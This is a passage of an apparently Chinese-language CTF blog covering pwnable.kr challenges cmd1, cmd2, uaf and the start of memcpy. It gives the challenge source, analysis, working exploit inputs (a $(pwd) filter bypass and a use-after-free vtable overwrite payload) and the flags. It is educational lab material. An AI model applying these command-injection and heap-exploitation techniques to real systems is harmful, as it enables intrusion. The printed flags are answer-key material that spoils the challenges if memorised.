class="language-shell">cmd1@pwnable:~$ /home/cmd1/cmd1 "/bin/cat /home/cmd1/f*"mommy now I get what PATH environment is for :)</code></pre><h2 id="15-cmd2"><a href="#15-cmd2" class="headerlink" title="15. cmd2"></a>15. cmd2</h2><h3 id="题目-14"><a href="#题目-14" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> cmd<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> r<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"="</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"PATH"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"export"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"`"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> r<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">extern</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> environ<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">delete_env</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> p<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>p<span class="token operator">=</span>environ<span class="token punctuation">;</span> <span class="token operator">*</span>p<span class="token punctuation">;</span> p<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">*</span>p<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">*</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> envp<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">delete_env</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"PATH=/no_command_execution_until_you_become_a_hacker"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="分析-14"><a href="#分析-14" class="headerlink" title="分析"></a>分析</h3><p>过滤更彻底，想办法绕</p><h3 id="解题-14"><a href="#解题-14" class="headerlink" title="解题"></a>解题</h3><pre class=" language-shell"><code class="language-shell">cmd2@pwnable:~$ cd /cmd2@pwnable:/$ /home/cmd2/cmd2 '$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)f???'$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)f???FuN_w1th_5h3ll_v4riabl3s_haha</code></pre><h2 id="16-uaf"><a href="#16-uaf" class="headerlink" title="16. uaf"></a>16. uaf</h2><h3 id="题目-15"><a href="#题目-15" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span> </span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;cstring></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;cstdlib></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>using namespace std<span class="token punctuation">;</span>class Human<span class="token punctuation">{</span>private<span class="token punctuation">:</span>    virtual <span class="token keyword">void</span> <span class="token function">give_shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>protected<span class="token punctuation">:</span>    <span class="token keyword">int</span> age<span class="token punctuation">;</span>    string name<span class="token punctuation">;</span>public<span class="token punctuation">:</span>    virtual <span class="token keyword">void</span> <span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"My name is "</span> <span class="token operator">&lt;&lt;</span> name <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"I am "</span> <span class="token operator">&lt;&lt;</span> age <span class="token operator">&lt;&lt;</span> <span class="token string">" years old"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span>class Man<span class="token punctuation">:</span> public Human<span class="token punctuation">{</span>public<span class="token punctuation">:</span>    <span class="token function">Man</span><span class="token punctuation">(</span>string name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span><span class="token punctuation">{</span>        this<span class="token operator">-></span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        this<span class="token operator">-></span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        virtual <span class="token keyword">void</span> <span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        Human<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cout <span class="token operator">&lt;&lt;</span> <span class="token string">"I am a nice guy!"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span>class Woman<span class="token punctuation">:</span> public Human<span class="token punctuation">{</span>public<span class="token punctuation">:</span>        <span class="token function">Woman</span><span class="token punctuation">(</span>string name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span><span class="token punctuation">{</span>                this<span class="token operator">-></span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>                this<span class="token operator">-></span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        virtual <span class="token keyword">void</span> <span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        Human<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cout <span class="token operator">&lt;&lt;</span> <span class="token string">"I am a cute girl!"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    Human<span class="token operator">*</span> m <span class="token operator">=</span> new <span class="token function">Man</span><span class="token punctuation">(</span><span class="token string">"Jack"</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Human<span class="token operator">*</span> w <span class="token operator">=</span> new <span class="token function">Woman</span><span class="token punctuation">(</span><span class="token string">"Jill"</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    size_t len<span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> data<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> op<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"1. use\n2. after\n3. free\n"</span><span class="token punctuation">;</span>        cin <span class="token operator">>></span> op<span class="token punctuation">;</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span>op<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>                m<span class="token operator">-></span><span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                w<span class="token operator">-></span><span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>                len <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                data <span class="token operator">=</span> new <span class="token keyword">char</span><span class="token punctuation">[</span>len<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token function">read</span><span class="token punctuation">(</span><span class="token function">open</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">,</span> data<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>                cout <span class="token operator">&lt;&lt;</span> <span class="token string">"your data is allocated"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>                delete m<span class="token punctuation">;</span>                delete w<span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token punctuation">:</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h3 id="分析-15"><a href="#分析-15" class="headerlink" title="分析"></a>分析</h3><p>终于到 use-after-free 的题了</p><p>学习可以看下这个视频：<a href="https://www.youtube.com/watch?v=ZHghwsTRyzQ" target="_blank" rel="noopener">The Heap: How do use-after-free exploits work? - bin 0x16</a></p><p>题目提供了三种操作，分别对用 释放-分配-调用</p><ol><li>我们先来看下在堆中的结构，首先要确定大小为 24 字节</li></ol><pre class=" language-armasm"><code class="language-armasm">0x0000000000400efb <+55>:   mov    edi,0x180x0000000000400f00 <+60>:   call   0x400d90 <operator new(unsigned long)@plt></code></pre><p>在 heap 中我们也能看到分配了长度为0x20的空间，为什么不是0x18呢，是源自 malloc_chunk 时会进行对齐，具体可见这篇文章<a href="https://wiki.x10sec.org/pwn/heap/heap_structure/" target="_blank" rel="noopener">堆相关数据结构</a></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15916053178506.jpg" alt></p><p>通过 chunk 复用存入的结构体如下，可以看到数据分别对应</p><ul><li>8 (vptr)</li><li>8 (int_age)</li><li>8 (prt_name)</li></ul><p><strong>这里有个奇怪的点，可以看到 ptr_name 均是指向上一个chunk被复用部分中的除 priv_size 和 size 的剩余部分，可能是编译优化导致的？</strong></p><p>注意到是先通过 Man 的虚表去调用 introduce 方法</p><pre class=" language-armasm"><code class="language-armasm">pwndbg> x/4 0x4015700x401570 <vtable for Man+16>:    0x000000000040117a    0x00000000004012d20x401580 <vtable for Human>:    0x0000000000000000    0x00000000004015f0pwndbg> x 0x40117a0x40117a <Human::give_shell()>:    0x10ec8348e5894855pwndbg> x 0x4012d20x4012d2 <Man::introduce()>:    0x10ec8348e5894855</code></pre><p>所以我们只要能覆盖 vptr 使其指向 原地址-8，即0x401570 - 0x8 = 0x00401568，这样经过执行时的+0x8就会调用 give_shell 函数</p><p>这里还要注意，free 时先释放的 m 后释放的 w，所以填充时是先填充的 w 后填充 m，所以需要步骤 2 执行两次</p><p>另外，由于我们只需要填充 vptr 部分，所需 8 字节是小于释放的 chunk 的，所以会直接填充两次消耗释放的空间即可</p><h3 id="解题-15"><a href="#解题-15" class="headerlink" title="解题"></a>解题</h3><pre class=" language-shell"><code class="language-shell">uaf@pwnable:~$ python -c  'print "\x68\x15\x40\x00\x00\x00\x00\x00"' > /tmp/uafpassuaf@pwnable:~$ ./uaf 8 /tmp/uafpass1. use2. after3. free31. use2. after3. free2your data is allocated1. use2. after3. free2your data is allocated1. use2. after3. free1$ cat flagyay_f1ag_aft3r_pwning</code></pre><p>参考：</p><ol><li><a href="https://tzhuobo.gitee.io/2019/11/21/pwnable-kr-uaf/" target="_blank" rel="noopener">https://tzhuobo.gitee.io/2019/11/21/pwnable-kr-uaf/</a></li><li><a href="http://weaponx.site/2017/02/15/uaf-writeup-pwnable-kr/" target="_blank" rel="noopener">http://weaponx.site/2017/02/15/uaf-writeup-pwnable-kr/</a></li></ol><h2 id="17-memcpy"><a href="#17-memcpy" class="headerlink" title="17. memcpy"></a>17. memcpy</h2><h3 id="题目-16"><a href="#题目-16" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// compiled with : gcc -o memcpy memcpy.c -m32 -lm</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;signal.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;math.h></span></span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token function">rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"rdtsc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">slow_memcpy</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> dest<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> src<span class="token punctuation">,</span> size_t len<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> src<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> dest<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">fast_memcpy</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> dest<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> src<span class="token punctuation">,</span> size_t len<span class="token punctuation">)</span><span class="token punctuation">{</span>    size_t i<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 64-byte block fast copy</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>len <span class="token operator">>=</span> <span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        i <span class="token operator">=</span> len <span class="token operator">/</span> <span class="token number">64</span><span class="token punctuation">;</span>        len <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">64</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">--</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            __asm__ <span class="token function">__volatile__</span> <span class="token punctuation">(</span>            <span class="token string">"movdqa (%0), %%xmm0\n"</span>            <span class="token string">"movdqa 16(%0), %%xmm1\n"</span>            <span class="token string">"movdqa 32(%0), %%xmm2\n"</span>            <span class="token string">"movdqa 48(%0), %%xmm3\n"</span>            <span class="token string">"movntps %%xmm0, (%1)\n"</span>            <span class="token string">"movntps %%xmm1, 16(%1)\n"</span>            <span class="token string">"movntps %%xmm2, 32(%1)\n"</span>            <span class="token string">"movntps %%xmm3, 48(%1)\n"</span>            <span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token string">"r"</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            dest <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">;</span>            src <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// byte-to-byte slow copy</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span> <span class="token function">slow_memcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> src<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> dest<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> _IOLBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hey, I have a boring assignment for CS class.. :(\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The assignment is simple.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- What is the best implementation of memcpy?        -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- 1. implement your own slow/fast version of memcpy -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- 2. compare them with various size of data         -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- 3. conclude your experiment and submit report     -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This time, just help me out with my experiment and get flag\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"No fancy hacking, I promise :D\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> t1<span class="token punctuation">,</span> t2<span class="token punctuation">;</span>    <span class="token keyword">int</span> e<span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> src<span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> dest<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> low<span class="token punctuation">,</span> high<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> size<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// allocate memory</span>    <span class="token keyword">char</span><span class="token operator">*</span> cache1 <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x4000</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> MAP_PRIVATE<span class="token operator">|</span>MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> cache2 <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x4000</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> MAP_PRIVATE<span class="token operator">|</span>MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    src <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x2000</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> MAP_PRIVATE<span class="token operator">|</span>MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    size_t sizes<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// setup experiment parameters</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>e<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">;</span> e<span class="token operator">&lt;</span><span class="token number">14</span><span class="token punctuation">;</span> e<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 2^13 = 8K</span>        low <span class="token operator">=</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>e<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        high <span class="token operator">=</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"specify the memcpy amount between %d ~ %d : "</span><span class="token punctuation">,</span> low<span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> size <span class="token operator">&lt;</span> low <span class="token operator">||</span> size <span class="token operator">></span> high <span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"don't mess with the experiment.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        sizes<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> size<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ok, lets run the experiment with your configuration\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// run experiment</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        size <span class="token operator">=</span> sizes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"experiment %d : memcpy with buffer size %d\n"</span><span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        dest <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span> size <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">memcpy</span><span class="token punctuation">(</span>cache1<span class="token punctuation">,</span> cache2<span class="token punctuation">,</span> <span class="token number">0x4000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// to eliminate cache effect</span>        t1 <span class="token operator">=</span> <span class="token function">rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">slow_memcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> src<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// byte-to-byte memcpy</span>        t2 <span class="token operator">=</span> <span class="token function">rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ellapsed CPU cycles for slow_memcpy : %llu\n"</span><span class="token punctuation">,</span> t2<span class="token operator">-</span>t1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">memcpy</span><span class="token punctuation">(</span>cache1<span class="token punctuation">,</span> cache2<span class="token punctuation">,</span> <span class="token number">0x4000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// to eliminate cache effect</span>        t1 <span class="token operator">=</span> <span class="token function">rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fast_memcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> src<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// block-to-block memcpy</span>        t2 <span class="token operator">=</span> <span class="token function">rdtsc</span><span class="token punctuation">(</span><span 